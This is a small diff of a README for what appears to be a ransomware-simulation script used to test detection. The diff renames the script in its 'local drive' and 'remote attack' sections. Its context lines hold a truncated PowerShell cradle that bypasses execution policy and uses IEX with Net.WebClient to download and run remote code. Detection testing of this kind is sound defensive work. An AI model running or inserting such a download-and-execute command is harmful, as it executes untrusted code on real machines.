@@ -69,7 +69,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 
 # How it works
 
-###### EncryptDelTestv4.ps1 (local drive)
+###### EncryptDelTestv4.1.ps1 (local drive)
 
 | CANNOT detect | CAN detect |
 |---------------|---------------|
@@ -79,7 +79,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 
 #
 
-###### EncryptDelTestv4.ps1 (remote attack)
+###### EncryptDelTestv4.1.ps1 (remote attack)
 
 | CAN detect |
 |---------------|
